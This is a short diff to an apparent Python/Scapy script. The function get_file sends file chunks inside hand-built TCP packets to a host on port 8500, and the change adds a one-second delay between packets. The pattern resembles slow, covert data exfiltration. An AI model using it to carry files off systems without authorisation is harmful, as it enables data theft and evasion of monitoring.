@@ -27,3 +27,4 @@ def get_file(filepath, host_ip):
     for chunk in chunks:
         pkt = IP(dst=host_addr)/TCP(sport=RandShort(), dport=8500)/chunk.encode("utf-8")
         send(pkt, verbose=False)
+        time.sleep(1)
